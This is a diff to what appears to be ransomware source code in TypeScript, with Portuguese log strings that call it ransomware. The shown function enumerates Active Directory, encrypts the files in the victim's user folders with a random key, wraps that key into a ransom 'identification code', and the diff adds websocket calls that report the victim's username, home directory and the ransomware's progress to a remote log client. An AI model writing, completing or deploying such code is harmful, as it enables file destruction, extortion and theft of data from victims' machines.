@@ -7,29 +7,36 @@ import https from 'https';
 import createRandomString from './utils/generateRandomString';
 import enumerateAD from './enumerateAd';
 import isActive from './isActive';
+import sendLog from './websocket/client';
 
 const encrypt = () => {
   enumerateAD();
   isActive();
   const userName: string = os.userInfo().username;
+  setTimeout(() => sendLog(`[+] -> OS USERNAME ${userName}`), 1000);
   const userDir: string = `C:\\Users\\${userName}`;
-  console.log('Starting...\n');
-
+  setTimeout(
+    () => sendLog(`[+] -> DIRETÓRIO DEFAULT DO USUÁRIO: ${userDir}`),
+    1000,
+  );
+  setTimeout(() => sendLog(`[+] -> RANSOMWARE INICIADO`), 1000);
   const key: string = createRandomString(32);
   const iv: Buffer = crypto.randomBytes(16);
-
-  console.log('Encrypted Files :');
 
   for (let i = 0; i < config.targetFolder.length; i++) {
     console.log(i, config.targetFolder[i]);
     encryptDir(`${userDir}\\${config.targetFolder[i]}`, key, iv);
   }
-  console.log('\nEncryption Finished!\n');
 
   const keyData: string = `${key}${iv.toString('hex')}`;
   const idCode: string = encryptPublicKey(keyData);
 
   console.log(`Identification Code : ${idCode}\n`);
+  setTimeout(
+    () =>
+      sendLog(`[+] -> RANSOMWARE FINALIZADO, IDENTIFICATION CODE: ${idCode}`),
+    1000,
+  );
 };
 
 const encryptDir = (dir: string, key: string, iv: Buffer) => {
